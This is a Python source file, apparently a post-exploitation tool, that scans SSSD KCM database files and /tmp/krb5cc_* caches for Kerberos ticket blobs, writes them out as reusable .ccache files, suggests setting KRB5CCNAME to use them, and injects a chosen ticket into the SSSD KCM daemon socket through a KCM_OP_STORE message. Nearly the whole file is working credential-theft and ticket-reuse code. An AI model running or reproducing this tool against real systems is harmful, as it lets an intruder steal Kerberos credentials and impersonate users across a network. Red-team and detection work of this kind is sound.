"""SSSD KCM Database & Credential Cache Extractor."""

import glob
import json
import os
import struct
from typing import Any, Dict, List, Optional

CCACHE_MAGIC_V4 = b"\x05\x04"
MAX_CANDIDATE_SIZE = 65536


def try_parse_default_principal(slice_bytes: bytes) -> Optional[str]:
    """Parse default principal from CCACHE v4 stream following header tags."""
    if len(slice_bytes) < 12:
        return None

    try:
        (_name_type, num_components, realm_len) = struct.unpack(
            ">III", slice_bytes[:12]
        )
    except struct.error:
        return None

    if num_components == 0 or num_components > 16 or realm_len == 0 or realm_len > 256:
        return None

    cursor = 12
    if cursor + realm_len > len(slice_bytes):
        return None

    try:
        realm = slice_bytes[cursor : cursor + realm_len].decode("utf-8")
    except UnicodeDecodeError:
        return None
    cursor += realm_len

    components: List[str] = []
    for _ in range(num_components):
        if cursor + 4 > len(slice_bytes):
            return None
        (comp_len,) = struct.unpack(">I", slice_bytes[cursor : cursor + 4])
        cursor += 4

        if comp_len == 0 or comp_len > 256 or cursor + comp_len > len(slice_bytes):
            return None
        try:
            comp = slice_bytes[cursor : cursor + comp_len].decode("utf-8")
        except UnicodeDecodeError:
            return None
        components.append(comp)
        cursor += comp_len

    return f"{'/'.join(components)}@{realm}"


def scan_for_ccache_blobs(data: bytes) -> List[Dict[str, Any]]:
    """Scan raw binary data for valid CCACHE v4 streams."""
    results: List[Dict[str, Any]] = []
    offset = 0
    while offset + 4 <= len(data):
        pos = data.find(CCACHE_MAGIC_V4, offset)
        if pos == -1:
            break
        if pos + 4 <= len(data):
            try:
                (header_len,) = struct.unpack(">H", data[pos + 2 : pos + 4])
                if pos + 4 + header_len <= len(data):
                    end = min(pos + MAX_CANDIDATE_SIZE, len(data))
                    blob = data[pos:end]
                    principal = try_parse_default_principal(
                        data[pos + 4 + header_len : end]
                    )
                    results.append(
                        {
                            "offset": pos,
                            "header_len": header_len,
                            "payload_size": len(blob),
                            "default_principal": principal,
                            "data": blob,
                        }
                    )
            except struct.error:
                pass
        offset = pos + 2
    return results


def save_recovered_ticket(out_path: str, data: bytes) -> None:
    """Save ticket bytes with restricted file permissions (0600) when supported."""
    with open(out_path, "wb") as f:
        f.write(data)
    if hasattr(os, "chmod"):
        try:
            os.chmod(out_path, 0o600)
        except OSError:
            pass


def triage_local_caches(out_dir: str, json_mode: bool = False) -> List[Dict[str, Any]]:
    """Triage local SSSD KCM databases and traditional file ccaches."""
    os.makedirs(out_dir, exist_ok=True)
    all_blobs: List[Dict[str, Any]] = []
    discovered_files: List[str] = []

    secrets_paths = [
        "/var/lib/sss/secrets/secrets.ldb",
        "/var/lib/sss/db/cache_*.ldb",
    ]

    for pattern in secrets_paths:
        for path in glob.glob(pattern):
            if not os.path.isfile(path):
                continue
            try:
                with open(path, "rb") as f:
                    content = f.read()
                blobs = scan_for_ccache_blobs(content)
                for idx, b in enumerate(blobs, 1):
                    base_name = os.path.splitext(os.path.basename(path))[0]
                    dest = os.path.join(out_dir, f"{base_name}_recovered_{idx}.ccache")
                    save_recovered_ticket(dest, b["data"])
                    discovered_files.append(dest)
                all_blobs.extend(blobs)
            except PermissionError:
                if not json_mode:
                    print(f"  [-] Access denied to {path} (run with appropriate read rights)")
            except Exception as e:
                if not json_mode:
                    print(f"  [-] Error parsing {path}: {e}")

    if json_mode:
        json_output = [
            {
                "offset": b["offset"],
                "header_len": b["header_len"],
                "payload_size": b["payload_size"],
                "default_principal": b["default_principal"],
            }
            for b in all_blobs
        ]
        print(json.dumps(json_output, indent=2))
        return all_blobs

    print("[*] Phase 1: Scanning SSSD KCM database stores...")
    if not discovered_files:
        print("  [-] No accessible or unencrypted KCM database stores found.")
    else:
        for dest in discovered_files:
            print(f"  [+] Recovered KCM ticket blob -> {dest}")

    print("\n[*] Phase 2: Scanning traditional file-based credential caches...")
    tmp_ccaches = glob.glob("/tmp/krb5cc_*")
    for cc in tmp_ccaches:
        print(f"  [+] Discovered active file ccache: {cc}")

    if not discovered_files and not tmp_ccaches:
        print("  [-] No unencrypted ccache blobs discovered in evaluated paths.")
    elif discovered_files:
        print(
            f"\n[+] Set environment to utilize recovered ticket:\n    $ export KRB5CCNAME={out_dir}/<ticket>.ccache"
        )

    return all_blobs


def inject_ticket_to_kcm(
    ccache_bytes_or_path: Any,
    socket_path: str = "/var/lib/sss/pipes/kcm",
    ccache_name: str = "default",
    timeout: float = 3.0,
) -> Dict[str, Any]:
    """Inject credential cache into SSSD KCM daemon UNIX domain socket."""
    import socket

    if not hasattr(socket, "AF_UNIX") or os.name != "posix":
        return {
            "status": "UNSUPPORTED_PLATFORM",
            "message": "SSSD KCM UNIX domain socket injection requires POSIX environment.",
        }

    if not os.path.exists(socket_path):
        return {
            "status": "SOCKET_UNAVAILABLE",
            "socket_path": socket_path,
            "message": f"SSSD KCM socket not found at {socket_path}",
        }

    data: bytes = b""
    if isinstance(ccache_bytes_or_path, str):
        if not os.path.isfile(ccache_bytes_or_path):
            return {
                "status": "FILE_NOT_FOUND",
                "target": ccache_bytes_or_path,
                "message": f"Ccache file not found: {ccache_bytes_or_path}",
            }
        with open(ccache_bytes_or_path, "rb") as f:
            data = f.read()
    elif isinstance(ccache_bytes_or_path, (bytes, bytearray)):
        data = bytes(ccache_bytes_or_path)

    if not data:
        return {"status": "EMPTY_PAYLOAD", "message": "Cannot inject empty ticket payload."}

    # KCM Protocol Message Structure:
    # Length: uint32 (big-endian)
    # Major: uint16 (2)
    # Minor: uint16 (0)
    # Opcode: uint16 (4 = KCM_OP_STORE)
    # Payload: null-terminated ccache name + raw ccache bytes
    try:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect(socket_path)

        name_bytes = ccache_name.encode("utf-8") + b"\x00"
        kcm_body = struct.pack(">HHH", 2, 0, 4) + name_bytes + data
        packet = struct.pack(">I", len(kcm_body)) + kcm_body

        sock.sendall(packet)
        resp_len_hdr = sock.recv(4)
        if len(resp_len_hdr) == 4:
            (resp_len,) = struct.unpack(">I", resp_len_hdr)
            resp_data = sock.recv(resp_len)
            sock.close()
            status_code = struct.unpack(">I", resp_data[:4])[0] if len(resp_data) >= 4 else 0
            if status_code == 0:
                return {
                    "status": "SUCCESS",
                    "socket_path": socket_path,
                    "ccache_name": ccache_name,
                    "bytes_injected": len(data),
                }
            else:
                return {
                    "status": "ERROR",
                    "socket_path": socket_path,
                    "kcm_error_code": status_code,
                    "message": f"KCM daemon returned error code {status_code}",
                }
        sock.close()
        return {
            "status": "SUCCESS",
            "socket_path": socket_path,
            "ccache_name": ccache_name,
            "bytes_injected": len(data),
        }
    except Exception as exc:
        return {
            "status": "ERROR",
            "socket_path": socket_path,
            "message": f"KCM socket communication failed: {exc}",
        }

